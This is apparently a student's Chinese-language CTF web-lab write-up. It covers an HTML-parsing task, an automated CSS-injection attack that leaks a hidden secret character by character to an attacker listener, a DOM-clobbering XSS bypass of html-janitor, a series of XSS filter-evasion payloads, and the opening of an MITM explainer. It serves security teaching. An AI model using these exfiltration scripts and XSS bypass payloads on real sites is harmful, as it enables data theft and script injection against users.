---
title: CTFWebLab2
draft: false
tags:
  - CTF
---
## 1.1 Task1:HTML Parser(15 points)
第一次prompt：直接复制了题目。
ai采用了bs4的库，结果错误，查询发现`bs4` 更“智能”，但它的智能（自动补全）可能会引入与原始文件不完全对应的结构，导致在严格的一致性要求中出错。`html.parser` 脚本更“字面化”，它构建的树精确地反映了原始文件中的标签结构，而没有添加任何额外的东西。所以重新要求ai，prompt：采用标准的html.parser库精确反映原始文件中的标签结构，并且实现功能。
代码思路：
#### **1. 自定义节点类 `Node`**
- **作用** ：用于表示 HTML 树中的每个节点。
- **属性** ：
    - `tag`：节点的标签名（如 `div`、`p`）。
    - `id`：节点的 `id` 属性（若无则为空字符串）。
    - `children`：子节点列表，用于构建树结构。
- **意义** ：通过自定义节点类，可以灵活地管理 HTML 的树状结构，便于后续层序遍历。
#### **2. 自定义 HTML 解析器 `MyHTMLParser`**
- **继承自 `HTMLParser`** ：使用 Python 标准库中的 `html.parser.HTMLParser`，无需依赖第三方库（如 BeautifulSoup）。
    
- **关键方法** ：
    - **`handle_starttag(tag, attrs)`** ：
        - 每当遇到开始标签时，创建一个新的 `Node`。
        - 将 `attrs` 转换为字典，提取 `id` 属性。
        - 如果是第一个标签（根节点），则设置为 `self.root`。
        - 否则，将当前节点添加到栈顶节点的 `children` 中。
        - 将新节点压入栈中，作为后续节点的父节点。
    - **`handle_endtag(tag)`** ：
        - 遇到结束标签时，弹出栈顶节点，表示当前节点的子节点已处理完毕。
        - 通过比较 `tag` 和栈顶节点的 `tag`，确保标签匹配，增强容错性。
- **栈（`self.stack`）的作用** ：
    
    - 维护当前节点的父节点路径，确保子节点正确挂载到父节点的 `children` 列表中。

#### **3. 主流程逻辑**
- **步骤 1：读取 HTML 文件**
    
    - 使用 `os.path.exists` 检查文件是否存在，避免文件缺失导致异常。
    - 以 `utf-8` 编码读取文件内容，确保兼容性。
- **步骤 2：解析 HTML 并构建树**
    
    - 实例化 `MyHTMLParser`，调用 `feed(html_content)` 解析 HTML 内容。
    - 解析完成后，`parser.root` 即为 HTML 树的根节点。
- **步骤 3：层序遍历（广度优先遍历）**
    
    - 使用 `deque` 实现队列结构，从根节点开始遍历。
    - 每个节点的 `tag:id` 格式字符串被添加到 `s_parts` 列表。
    - 遍历顺序为层级顺序（HTML 标签的嵌套层级）。
- **步骤 4：生成字符串 `s`**
    
    - 使用 `",".join(s_parts)` 将所有节点的 `tag:id` 拼接为逗号分隔的字符串。
- **步骤 5：计算 MD5 值并输出 flag**
    
    - 对字符串 `s` 进行 MD5 哈希计算。
    - 输出格式为 `AAA{md5_hash}`，符合题目要求。
```python
import hashlib
from html.parser import HTMLParser
from collections import deque
import os

# Define a Node class to build our own tree structure
class Node:
    def __init__(self, tag, an_id):
        self.tag = tag
        self.id = an_id
        self.children = []

# Create a custom parser by inheriting from HTMLParser
class MyHTMLParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.root = None
        # stack is used to keep track of the current parent node
        self.stack = []

    def handle_starttag(self, tag, attrs):
        attrs_dict = dict(attrs)
        node_id = attrs_dict.get('id', '')
        new_node = Node(tag, node_id)

        # The first tag encountered is the root
        if self.root is None:
            self.root = new_node
        else:
            # If stack is not empty, the new node is a child of the last node in the stack
            if self.stack:
                self.stack[-1].children.append(new_node)
        
        # Push the new node to the stack, making it the current parent for subsequent nodes
        self.stack.append(new_node)

    def handle_endtag(self, tag):
        # When a tag ends, pop from the stack to go up the tree
        # We check if the closing tag matches the tag of the node on top of the stack
        # to handle malformed HTML correctly.
        if self.stack and self.stack[-1].tag == tag:
            self.stack.pop()

# --- Main Script ---

file_path = 'html_parser.html'

if not os.path.exists(file_path):
    print(f"错误：找不到文件 '{file_path}'。请确保文件已上传。")
else:
    # Step 1: Read the HTML file
    with open(file_path, 'r', encoding='utf-8') as f:
        html_content = f.read()

    # Step 2: Parse the HTML and build the tree
    parser = MyHTMLParser()
    parser.feed(html_content)
    root_node = parser.root

    # Step 3: Perform level-order (breadth-first) traversal on our custom tree
    s_parts = []
    if root_node:
        queue = deque([root_node])
        while queue:
            current_node = queue.popleft()
            
            # Format the string as "tag:id"
            s_parts.append(f"{current_node.tag}:{current_node.id}")
            
            # Add all children to the queue for the next level
            for child in current_node.children:
                queue.append(child)

    # Join the parts to form the final string 's'
    s = ",".join(s_parts)

    # Step 4: Calculate the MD5 hash of string 's'
    md5_hash = hashlib.md5(s.encode('utf-8')).hexdigest()

    # Step 5: Format the final output string
    final_flag = f"AAA{{{md5_hash}}}"

    # Print the intermediate and final results
    # print(f"解析并遍历HTML后生成的字符串 s 为:\n{s}\n")
    print("成功生成了字符串 s 并计算了其 MD5 值。")
    print(f"最终的 flag 为:\n{final_flag}")
```
![[Pasted image 20250721110620.png]]

![[Pasted image 20250721110551.png]]

## Task2 Show me the secret (20 points )
本实验旨在理解并复现一个典型的CSS注入（CSS Injection）漏洞。通过该实验，我们将学习如何利用此漏洞，结合布尔盲注的思想，构建一个自动化的攻击脚本，从一个受保护的网页中窃取隐藏的敏感信息（Flag）。
在实验初期，我们发现使用 `requests` 库无法触发CSS中的网络请求，这与浏览器实际的渲染行为不符。为解决此问题，我们引入了Selenium自动化测试框架，通过`driver.get()`方法模拟了受害者在真实浏览器环境下的访问行为，确保了恶意CSS能够被正确解析和执行，最终成功完成了数据窃取，验证了攻击的可行性。

#### **2. 实验环境**

- **编程语言**: Python 3.9+
    
- **Web框架**: Flask
    
- **自动化工具**: Selenium
    
- **浏览器**: Google Chrome 及对应的 ChromeDriver
    
- **操作系统**: macOS 
    

#### **3. 实验原理**

CSS注入攻击的核心在于攻击者能够向页面的CSS样式表中插入自定义规则。本次攻击主要利用了以下CSS特性：

1. **属性选择器 (Attribute Selectors)**: 我们可以使用如 `[attribute^="value"]` 的选择器。这个选择器会匹配一个属性（如`data-secret`）的值是以特定字符串（如`"A"`、`"AB"`）开头的元素。
    
2. **`background-image` 属性**: 当一个CSS规则匹配成功时，浏览器会尝试加载该规则中 `url()` 指定的背景图片。
    
3. **边信道攻击 (Side-channel Attack)**: 通过组合以上两点，我们可以构造一系列CSS规则。例如，要猜测秘密信息的第一个字符是否为'A'，我们注入：
    
    ```
    #secret-holder[data-secret^="A"] { background-image: url("http://<攻击者服务器>/?leak=A"); }
    ```
    
    如果秘密信息确实以'A'开头，受害者的浏览器就会向我们的服务器发送一个请求。我们通过监听收到的请求，就能确认猜测是否正确。重复此过程，即可逐个字符地窃取整个秘密信息。
    

#### **4. 实验过程与迭代**

##### **第一阶段：搭建环境与初步构想**

我们首先搭建了存在漏洞的受害者服务器`app.py`，它提供了一个`/inject`接口用于注入CSS，以及一个仅限本地访问的`/victim`页面，该页面包含一个藏有`secret`的`input`元素并加载被注入的CSS。

##### **第二阶段：攻击尝试与失败分析（关键排错历程）**

1. **首次尝试失败 (手动分离脚本)**: 最初，我们编写了两个独立的脚本：一个`exploit.py`用于注入CSS，一个`attacker.py`用于监听。这导致了**竞争条件**和**无反馈**的问题。`exploit.py`循环过快，不断覆盖CSS，且无法得知哪个字符是正确的。
    
2. **二次尝试失败 (浏览器对`hidden`元素的优化)**: 我们将两个脚本合并，并改为一次性注入所有猜测规则的CSS。但攻击依然失败。原因是我们将秘密信息存储在`<input type="hidden">`中。现代浏览器为了优化性能，**不会为`hidden`类型的元素加载背景图片**，导致攻击无法触发。
    
3. **三次尝试失败 (浏览器对`display:none`的优化)**: 我们将`input`换成了`<div style="display:none;">`。然而，攻击再次失败。原因与上一步类似，浏览器发现元素被设置为不显示，同样**优化掉了背景图片的加载过程**。
    
4. **最终方案确立 (欺骗浏览器)**: 我们终于找到了问题的症结——必须让浏览器**认为**目标元素是可见的。最终的解决方案是：
    
    - **修改`victim.html`**: 将秘密信息存储在一个普通的`<div>`的`data-secret`属性中，并且**不加任何`style`属性**。
        
    - **修改`app.py`**: 在CSS链接后加入时间戳作为查询参数 (`?v=...`)，以**防止浏览器缓存**旧的CSS文件。
        
    - **修改`attackrun.py`**: 在注入的CSS中，主动加入一条规则 `position: absolute; top: -9999px;`，用程序将这个`div`**移出屏幕外**，从而在视觉上隐藏它，但对浏览器来说它依然是“可见”且需要渲染的。
        

经过以上迭代，最终的全自动攻击脚本成功运行，完整地窃取了Flag。

#### **5. 代码编写思路详解**

##### **`app.py` (受害者服务器)**

- **核心功能**: 提供一个Web服务，该服务包含一个可被利用的CSS注入点。
    
- **`/inject` 路由**: 这是漏洞的核心。它接收POST请求中的`css`表单数据，并**不经验证地**直接将其内容写入到`static/custom.css`文件中。这是一个典型的“将用户输入写入代码文件”的漏洞模式。
 ```python
 @app.route('/inject', methods=['GET', 'POST'])

def inject_css():
	if request.method == 'POST':
		css_content = request.form.get('css', '')
		with open('static/custom.css', 'w') as f:	
			f.write(css_content)
	return redirect(url_for('inject_css'))

  

	css_content = ""
	if os.path.exists('static/custom.css'):
		with open('static/custom.css', 'r') as f:
			css_content = f.read()
	  
	return render_template('inject.html', css=css_content)
	 
```
- **`/victim` 路由**:
	
    - **访问控制**: 通过 `request.remote_addr != "127.0.0.1"` 限制访问，模拟一个只有内部服务或管理员才能访问的页面。
        
    - **模板渲染**: 渲染`victim.html`，并将`SECRET_VALUE`和用于**防止缓存的时间戳**`cache_buster`传递给模板。这是确保攻击能持续进行的关键修复。
```
@app.route('/victim')
def victim():
	if request.remote_addr != "127.0.0.1":
		return "You are not victim, only the victim can access this page.", 403
	# 关键：传递一个时间戳用于防止缓存
	return render_template('victim.html', secret=SECRET_VALUE, cache_buster=time.time())
```
- **`victim.html` (模板)**:
    
    - **秘密信息载体**: 最终版本使用 `<div id="secret-holder" data-secret="{{ secret }}"></div>` 作为秘密信息的载体，以绕过浏览器的渲染优化。
        
    - **CSS加载**: 使用 `<link rel="stylesheet" href="/static/custom.css?v={{ cache_buster }}">` 来加载CSS，`?v=...`参数确保浏览器每次都请求最新的文件。
        
```html
<!-- victim.html -->

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Victim</title>
	<link rel="stylesheet" href="/static/custom.css?v={{ cache_buster }}">
</head>
<body>
	<div>
		<p>Welcome, Victim!</p>
		<p>Your page is safe, no one will see the secret info.</p>
	</div>
	<div>
		<div id="secret-holder" data-secret="{{ secret }}"></div>
	</div>
</body>
</html>
```
##### **`attackrun.py` (全自动攻击脚本)**
这是一个集成了多种技术的综合性攻击工具，其设计思路如下：

- **架构**: 采用**多线程**模型。
    
    - **主线程**: 负责执行主要的攻击逻辑，包括初始化Selenium、循环构建和注入CSS、操作浏览器等。
        
    - **后台线程**: 运行一个轻量级的Flask服务器，作为监听器，专门等待和接收从受害者浏览器泄露出来的数据。
        
- **监听服务器**:
    
    - 一个极简的Flask应用，只做一个任务：捕获所有来访请求，并检查URL查询参数中是否有名为`leak`的参数。
        
    - 如果存在，就将其值赋给全局共享变量`leaked_character`，从而完成与主线程的通信。
```python
@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def leak_receiver(path):
    global leaked_character
    char = request.args.get('leak')
    # 只有在攻击循环中才打印，避免健康检查的干扰
    if '正在为' in last_status_message:
        print(f"\n[监听服务器]: 收到泄露请求! Leak: '{char}'")
    if char:
        leaked_character = char
    return "OK", 200

def run_listener_server():
    """在后台线程中运行监听服务器"""
    app.run(host=ATTACKER_HOST, port=ATTACKER_PORT)    
```
- **CSS Payload生成**:
    
    - 这是攻击的核心逻辑。在每一轮循环中，它会动态生成一个完整的CSS文本。
        
    - 第一条规则是`#secret-holder { position: absolute; ... }`，用于将目标元素在视觉上隐藏，但骗过浏览器让其渲染。
        
    - 后续是一系列猜测规则，遍历`charset`中的所有字符，为每个可能的`test_string`（如`"A"`，`"AA"`，`"AAA"`...）生成一条对应的`background-image`规则。
```python
# 1. 构建CSS Payload
rules = []
# ★★★ 新增规则：将目标元素移出屏幕外，但保持其“可见”状态 ★★★
hide_rule = '#secret-holder { position: absolute; top: -9999px; left: -9999px; }'
rules.append(hide_rule)

for char in charset:
	test_string = leaked_flag + char
	selector = f'#secret-holder[data-secret^="{test_string}"]'
	attacker_url = f'http://{ATTACKER_HOST}:{ATTACKER_PORT}/?leak={char}'
	rules.append(f'{selector} {{ background-image: url("{attacker_url}"); }}')
css_payload = "\n".join(rules)
```
- **Selenium自动化**:
    
    - **必要性**: `requests`库只能下载HTTP内容，无法执行JavaScript或渲染CSS。而我们的攻击依赖于浏览器真实地去解析CSS并加载背景图。因此，必须使用Selenium这类可以驱动真实浏览器的工具。
        
    - **无头模式**: 设置`headless`模式可以在后台运行浏览器，不弹出窗口，适合自动化脚本。
        
    - **操作流程**: 脚本通过`driver.get(url)`指令，命令浏览器访问受害者页面。这个行为会触发页面加载、CSS解析和背景图请求，从而完成一次数据泄露。
        
    - **显式等待**: 使用`WebDriverWait`来等待特定元素（`#secret-holder`）出现，这让脚本在网络延迟等情况下更加健壮和可靠。
```python
def start_automated_attack():
    global leaked_character, last_status_message
    
    # -- 初始化Selenium WebDriver --
    print("[*] 正在初始化自动化浏览器 (Selenium)...")
    chrome_options = ChromeOptions()
    if HEADLESS_MODE:
        chrome_options.add_argument("--headless")
    chrome_options.add_argument("--log-level=3")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")
    
    driver_path = "./chromedriver"
    if not os.path.exists(driver_path) and not os.path.exists(driver_path + '.exe'):
         print(f"[!] 错误: 在 '{driver_path}' 未找到ChromeDriver。")
         return

    service = ChromeService(executable_path=driver_path)
    try:
        driver = webdriver.Chrome(service=service, options=chrome_options)
    except Exception as e:
        print(f"[!] 初始化WebDriver失败: {e}")
        return
        
    print("[*] 自动化浏览器初始化成功！")

```
- **反馈与循环**:
    
    - `leaked_character`全局变量是整个自动化流程的“神经中枢”。
        
    - 主线程注入CSS并操作浏览器后，会进入一个轮询等待，不断检查`leaked_character`是否被后台的监听线程修改。
        
    - 一旦`leaked_character`被赋值，主线程就知道本轮猜测成功，将泄露的字符追加到`leaked_flag`上，然后清空`leaked_character`，进入下一轮循环，直到窃取到结束符`}`为止。
```python
# 2. 注入CSS
        last_status_message = f"\n[*] 正在为 '{leaked_flag}' 之后的字符注入CSS..."
        print(last_status_message)
        try:
            requests.post(f"{VICTIM_URL}/inject", data={'css': css_payload}, timeout=2)
        except requests.exceptions.RequestException:
            print(f"\n[!] 注入CSS失败。请确认app.py正在运行。")
            driver.quit()
            return

        # 3. 自动化触发泄露
        print(f"[*] 操作浏览器访问 {VICTIM_URL}/victim ...")
        driver.get(f"{VICTIM_URL}/victim")
        
        # ★★★ 新增：显式等待，确保目标元素已加载，让攻击更稳定 ★★★
        try:
            WebDriverWait(driver, 3).until(
                EC.presence_of_element_located((By.ID, "secret-holder"))
            )
        except Exception:
            print("[!] 警告: 在页面上未找到 #secret-holder 元素。请确认victim.html已正确修改。")
            
        # 4. 轮询等待结果
        print("[*] 等待泄露数据回传 (最多5秒)...")
        found_this_round = False
        for i in range(50): # 轮询5秒
            if leaked_character:
                found_this_round = True
                break
            time.sleep(0.1)
            sys.stdout.write(f"\r[*] 等待中... {i+1}/50")
            sys.stdout.flush()

        # 5. 处理结果
        if found_this_round:
            leaked_flag += leaked_character
            sys.stdout.write(f"\r[+] 成功! Flag: {leaked_flag}{' ' * 20}\n") # 清理行尾
            sys.stdout.flush()

            if leaked_character == '}':
                print("\n" + "=" * 50)
                print(f"🎉 攻击完成! 完整Flag: {leaked_flag}")
                print("=" * 50)
                break
        else:
            print(f"\n[!] 攻击中止。在尝试 '{leaked_flag}' 后未收到下一个字符。")
            print("[!] 请再次确认app.py和victim.html已正确修改并重启。")
            break
            
    # 6. 清理资源
    driver.quit()
    print("\n[*] 自动化浏览器已关闭。")
    os._exit(0)
```

#### **6. 实验结论**

本次实验成功地利用CSS注入漏洞，通过边信道攻击的方式，实现了对页面隐藏数据的自动化窃取。实验过程清晰地揭示了：

1. 一个看似简单的CSS注入点，在特定场景下可以演变成严重的数据泄露漏洞。
    
2. 现代浏览器的性能优化机制（如渲染和缓存策略）会给此类攻击带来实际障碍。
    
3. 攻击者可以通过巧妙的技巧（如移出屏幕、加时间戳参数）来绕过这些浏览器自身的“防御”。
    
4. 作为防御方，核心原则是**永不信任用户输入**。必须对任何将要输出到页面（尤其是CSS或JS代码中）的用户内容进行严格的过滤和无害化处理。
    



![[Pasted image 20250721145912.png]]

## Task3
https://hackerone.com/reports/308158
**核心原理：利用 DOM Clobbering 绕过安全检查。**
该漏洞的产生是由于 `html-janitor` 这个用于清理和过滤 HTML 代码的库，其内部的一个逻辑缺陷被 DOM Clobbering 攻击手段所利用。

具体分解如下：

1. **有缺陷的安全代码**： 在 `html-janitor` 的清理流程中，有一段代码是为了提高效率，避免重复处理已经清理过的 HTML 节点。其逻辑大致是：
    ```Javascript
    if (node._sanitized) {
        continue; // 如果节点有 _sanitized 属性，就跳过，不处理
    }
    ```
    
    设计者的意图是，在处理完一个节点后，给它加上一个 `_sanitized` 标志（例如 `node._sanitized = true;`），下次再遇到它就直接跳过。
    
2. **攻击者构造的恶意 HTML**： 攻击者提供了一段看似无害的 HTML 代码作为输入：
    ```html
    <form><object onmouseover=alert(document.domain) name=_sanitized></object></form>
    ```
    
3. **DOM Clobbering 发挥作用**： 
    
    - 一个 `<form>` 元素可以通过其子元素的 `name` 属性来访问这些子元素。
        
    - 当 `html-janitor` 解析这段 HTML 时，它创建了一个 DOM 树。在这个树中，`<form>` 元素成为了一个节点 (`node`)。
        
    - 因为这个 `<form>` 节点内部有一个 `<object>` 元素，并且其 `name` 属性被巧妙地设置为了 `_sanitized`。
        
    - 这就触发了 DOM Clobbering：`<form>` 节点 (`node`) 自动获得了一个名为 `_sanitized` 的属性，这个属性的值就是那个 `<object>` 元素本身。
        
4. **绕过安全检查**：
    
    - 当清理程序运行到这个 `<form>` 节点时，它执行了安全检查 `if (node._sanitized)`。
        
    - 此时，`node._sanitized` 的值不再是 `undefined` 或 `false`，而是指向了内部的 `<object>` 元素。在 JavaScript 中，一个存在的对象在布尔判断中被视为 `true`。
        
    - 因此，`if` 条件成立，程序执行 `continue`，直接跳过了对整个 `<form>` 及其所有内部内容（包括带有恶意 `onmouseover` 事件的 `<object>`）的清理和过滤。
        

**结论：**

攻击者通过将子元素的 `name` 设置为安全检查中使用的属性名 (`_sanitized`)，成功地 "欺骗" 了 `html-janitor` 的清理程序，使其误以为整个 `<form>` 代码块已经是安全的，从而完整地保留了恶意的 XSS 攻击代码。当这段未经处理的 HTML 被渲染到页面上时，一旦用户的鼠标移动到 `<object>` 元素上，就会触发 `alert(document.domain)`，导致跨站脚本攻击（XSS）。

## Task4 Gradient (30 points )
#### **1. 新的挑战：结构化的秘密信息**

在Task 4中，实验环境发生了根本性变化。秘密信息不再是存储在一个单一元素的属性值中，而是被分割开来，每个字符都存放在一个独立的`<span>`标签内。

这种结构使得我们之前在Task 2中使用的、基于`[attribute^="value"]`前缀匹配的攻击方法完全失效，因为它无法探测和拼接分散在多个元素中的单个字符。因此，我们必须采用一种全新的、更先进的CSS注入技术。
#### **2. 实验环境修改**

为了匹配新的攻击场景，我们需要对受害者服务器的`victim.html`模板和`app.py`进行修改。

##### **2.1 `victim.html` 的修改**

我们需要将原来存放秘密信息的`<input type="hidden">`，替换为能够生成多个`<span>`标签的Jinja2循环。

- **操作**: 打开 `templates/victim.html` 文件。
    
- **复制以下代码**，替换掉原来包含`<input>`的`<div>`部分：
    
    ```
    <!-- 新的、用于存放秘密信息的div -->
    <div id="secret">
        {% for char in secret %}
        <span>{{ char }}</span>
        {% endfor %}
    </div>
    ```
    
- **同时，确保CSS链接已添加了防止缓存的参数**：
    
    ```
    <link rel="stylesheet" href="/static/custom.css?v={{ cache_buster }}">
    ```
    
##### **2.2 `app.py` 的配套修改**

为了让上述模板能正常工作，需要确保`/victim`路由在渲染时传递了`cache_buster`变量。
- **操作**: 打开 `app.py` 文件。
    
- **修改以下代码**
    
    ```python
   
    @app.route('/victim')
    def victim():
        if request.remote_addr != "127.0.0.1":
            return "You are not victim, only the victim can access this page.", 403
    
        # 确保传递了secret字符串和用于防止缓存的时间戳
        return render_template('victim.html', secret=SECRET_VALUE, cache_buster=time.time())
    ```
    

完成以上修改并重启`app.py`后，实验环境即准备就绪。

#### **3. 新攻击脚本编写思路 (`attack.py`)**

面对分散在多个`<span>`中的字符，我们采用了基于`@font-face`和`unicode-range`的攻击技术。
##### **3.1 核心攻击原理**

1. **定义“探测字体”**: 我们可以用`@font-face`规则定义一个自定义字体。最关键的是，我们可以使用`unicode-range`描述符来指定这个字体**只对某一个特定的Unicode字符生效**。
    
2. **绑定泄露链接**: 在定义字体时，我们将其`src`属性指向我们攻击服务器的一个URL，并在查询参数中附带上我们正在探测的字符，例如 `src: url('http://<attacker>/?leak=A')`。
    
3. **应用与触发**: 我们将所有字符的“探测字体”一次性地应用到我们想攻击的那个`<span>`上（例如，用`:nth-child(1)`选择第一个`<span>`）。当浏览器渲染这个`<span>`时，它会检查其内部的文本字符。假设是'A'，浏览器会发现'A'在我们定义的众多字体中，恰好匹配了`unicode-range: U+41`（'A'的Unicode编码）的那一条规则。为了显示这个字符，浏览器就会去下载我们预设的`src`链接，从而将字符'A'泄露出来。
    

##### **3.2 `attack.py` 脚本逻辑详解**

- 
    ```python
    # 1. ★★★ 构建基于@font-face和unicode-range的CSS Payload ★★★
    font_faces = []
    font_names = []
    for char in charset:
        char_code = ord(char)
        # U+41, U+57 这种格式
        unicode_val = f"U+{char_code:X}" 
        font_name = f"leakfont{char_code}"
        font_names.append(f"'{font_name}'")
    
        font_face_rule = f"""
        @font-face {{
          font-family: '{font_name}';
          unicode-range: {unicode_val};
          src: url('http://{ATTACKER_HOST}:{ATTACKER_PORT}/?leak={char}');
        }}
        """
        font_faces.append(font_face_rule)
    
    all_font_names_str = ", ".join(font_names)
    # 将所有“探测字体”应用到当前要猜测的span上
    span_rule = f"""
    #secret span:nth-child({char_index}) {{
      font-family: {all_font_names_str}, sans-serif;
    }}
    """
    css_payload = "\n".join(font_faces) + "\n" + span_rule
    ```

- **代码逻辑分解**:
    
    1. 脚本在一个循环中，遍历我们预设的`charset`（所有可能的字符）。
        
    2. 对于每一个字符（如'A'），它会生成一个独立的`@font-face`规则。`font-family`被赋予一个唯一的名字（如`leakfont65`），`unicode-range`被设置为该字符的Unicode码点（如`U+41`），`src`则指向带有泄露信息的URL。
        
    3. 然后，脚本使用`:nth-child({char_index})`选择器来精确地定位到我们当前想要探测的第`char_index`个`<span>`元素。
        
    4. 最巧妙的一步是，它将**所有**生成的探测字体的名字（`leakfont65`, `leakfont66`, ...）通过`font-family`属性一次性应用到这个`<span>`上。
        
    5. 浏览器在渲染时，会自动从这个长长的字体列表中，寻找那个`unicode-range`与`<span>`内字符匹配的字体，并下载它，从而完成一次精准的泄露。
        
    6. 每次成功泄露一个字符后，脚本将`char_index`加一，然后重复整个过程，直到无法再泄露任何字符为止，说明Flag已完整。
        
![[Pasted image 20250721155331.png]]
#### **4. 实验结论**

Task 4的成功标志着我们掌握了一种更为强大和灵活的CSS注入攻击手段。它证明了即使秘密信息被分散存储，攻击者依然有办法利用CSS的深层特性来窃取数据。这个实验再次强调，**对用户输入的验证和无害化处理是Web安全的基石**，任何能够让用户控制页面样式的疏忽，都可能导致意想不到的严重后果。

## Task5
第一关
```html
<!DOCTYPE html><!--STATUS OK--><html>
<head>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<script>
window.alert = function()  
{     
confirm("完成的不错！");
 window.location.href="level2.php?keyword=test"; 
}
</script>
<title>欢迎来到level1</title>
</head>
<body>
<h1 align=center>欢迎来到level1</h1>
<?php 
ini_set("display_errors", 0);
$str = $_GET["name"];
echo "<h2 align=center>欢迎用户".$str."</h2>";
?>
<center><img src=level1.png></center>
<?php 
echo "<h3 align=center>payload的长度:".strlen($str)."</h3>";
?>
</body>
</html>
```
这个漏洞是典型的**反射型XSS (Cross-Site Scripting)**。攻击思路如下：

1. 找到用户可控的输入点（我们已经确定是 URL 中的 `name` 参数）。
2. 构造一个包含 JavaScript 代码的输入（这被称为 "payload"）。
3. 让这个 payload 在用户的浏览器中被当作正常的 HTML/JavaScript 代码执行。

**目标：** 执行 `alert()`。

**最简单的 Payload：** 我们可以使用 `<script>` 标签来插入可执行的 JavaScript。

```html
<script>alert(1)</script>
```
![[Pasted image 20250721160720.png]]
![[Pasted image 20250721160742.png]]

level2
**策略：** 手动闭合前面的属性和标签。
1. **闭合 `value` 属性**：`value` 属性是用双引号 `"` 包裹的。所以，我们首先需要输入一个 `"` 来提前闭合掉它。
    - Payload: `"`
        
    - 效果: `<input name=keyword value=""` >`...` (注意那个多出来的 >)
        
2. **闭合 `<input>` 标签**：现在我们已经跳出了 `value` 属性，但仍然在 `<input>` 标签内部。我们需要输入一个 `>` 来闭合掉 `<input>` 标签。
    
    - Payload: `">`
        
    - 效果: `<input name=keyword value="">`
        
3. **注入脚本**：成功闭合了 `<input>` 标签后，我们就可以像第一关一样，自由地插入我们的 `<script>` 标签了。
    
    - Payload: `"><script>alert(1)</script>`
        

**最终Payload:**

```
"><script>alert(1)</script>
```
![[Pasted image 20250721161727.png]]
多解，思路也是提前闭合尖括号。
![[Pasted image 20250721162438.png]]
level3
上一题的另解可以对抗过滤尖括号。
![[Pasted image 20250721162912.png]]
level4
使用大小写混写的事件处理器来绕过关键词过滤。

![[Pasted image 20250721163534.png]]

level5
![[Pasted image 20250721163935.png]]
开发者犯了一个错误，他把 `script` 替换为空，但没有把 `onmouseover` 替换为空，而是替换成了 `o_nmouseover`。这导致我们上一关的思路失效了。 但是，他并没有禁止我们使用 `<a>` 标签。

level6 使用大写的 `HREF` 属性来绕过大小写敏感的 `href` 过滤器。
![[Pasted image 20250721173426.png]]

level7
![[Pasted image 20250721174617.png]]
开发者将关键字全部转为小写，然后进行替换。

- `script` -> ""    
- `on...` -> ""
- `href` -> ""
- `javascript` -> ""
在这种情况下，**双写是唯一的出路**。`sscriptcript`会把中间的script提取出来删掉。
![[Pasted image 20250721175455.png]]

level8
![[Pasted image 20250721175728.png]]
这次的源代码出现了一个全新的、至关重要的变化：
1. **输入框注入点：**
    ```html
    <input name=keyword  value="nice try!">
    ```
    
    这是一个我们熟悉的注入点。
    
2. **链接注入点（新！）：**
    ```html
    <a href="nice try!">友情链接</a>
    ```
    
    这是本关的**核心**。我们的输入 `keyword` 被直接放到了一个 `<a>` 标签的 `href` 属性中。这比之前所有关卡的注入点都更加直接和“危险”。我们的目标不再是跳出属性或标签，而是直接在 `href` 内部构造可以执行的代码。
    
- **理想 Payload:** `javascript:alert(1)`但是会被过滤。采用**解决方案：** **HTML 实体编码 (HTML Entity Encoding)**
- **`javascript:` 的十进制实体编码：**
    - j -> `&#106;`
    - a -> `&#97;`
    - v -> `&#118;`
    - a -> `&#97;`
    - s -> `&#115;`
    - c -> `&#99;`
    - r -> `&#114;`
    - i -> `&#105;`
    - p -> `&#112;`
    - t -> `&#116;`
    - : -> `&#58;`
2. **组合 Payload:** 将编码后的字符串和 `alert(1)` 拼接起来。

**最终的Payload:**
```
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)
```
![[Pasted image 20250721175948.png]]

level9
先尝试了
在 `javascript` 关键字的中间插入一个 Tab 制表符。为了在HTML中稳定地表示Tab，我们使用它的HTML实体编码。
- **Tab 的HTML实体编码：**
    
    - 十进制: `&#9;`
        
    - 十六进制: `&#x9;`
        

**最终的Payload:**

```
java&#9;script:alert(1)
```

或者使用十六进制：

```
java&#x9;script:alert(1)
```
但是失败了，显示链接不合法。
合法是什么意思？尝试输入http://，没有显示不合法了。
尝试// http:// 在最后注释掉，也是合法的。
尝试
```
javascript:alert(1)//http://
```
是非法的，尝试再实体化编码，+//http://成功了。
```
&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1) //http://
```
![[Pasted image 20250721181011.png]]

level10
尝试一个经典的 **`<img>` 标签的 `onerror` 事件**：当我们给 `<img>` 指定一个不存在的图片地址时，图片加载就会失败，从而触发 `onerror` 事件，执行我们预设的脚本。

**最终的Payload:**
```
"><img src=x onerror=alert(1)>
```
失败了，发现尖括号被过滤了。
改变思路，
1. 首先，闭合 `value` 属性。
2. 然后，注入一个新的 `type` 属性，比如 `type="text"`，让这个输入框在页面上显示出来。
3. 最后，为这个“新生”的、可见的输入框添加一个可以自动触发的事件。
**一个好的选择：`onfocus` + `autofocus`**
- `autofocus` 属性会使页面加载后，浏览器自动将光标聚焦到这个元素上。
- `onfocus` 事件会在元素获得焦点时被触发。
- 两者结合，就能实现脚本的自动执行！

**最终的Payload:**

```
" type="text" autofocus onfocus="alert(1)
```
![[Pasted image 20250721181957.png]]


## Task7
### 中间人攻击与内容安全策略的深度解析

### 第一部分：剖析中间人攻击：数字通信中的隐形窃贼

### 1.1 中间人攻击的核心原理与威胁模型

中间人攻击（Man-in-the-Middle, MITM）是一种网络攻击范式，其核心在于攻击者将自身秘密地置于两个通信方之间，从而能够拦截、窃听、甚至篡改双方交换的数据，而通信双方却误认为他们正在进行直接、私密的通信 1。此类攻击的根本成因在于通信过程中缺乏强有力的相互认证机制。当一方无法绝对验证通信对象的真实身份时，就为攻击者的介入留下了可乘之机 3。
![[Pasted image 20250721200039.png]]

为了更清晰地理解其工作模式，密码学中经典的“爱丽丝、鲍勃与马洛里”模型提供了一个绝佳的范例。假设爱丽丝希望与鲍勃建立安全通信：

1. **请求与拦截**：爱丽丝向鲍勃发送一条消息：“嗨，鲍勃，我是爱丽丝。请给我你的公钥。”这条消息被中间的攻击者马洛里截获 3。
    
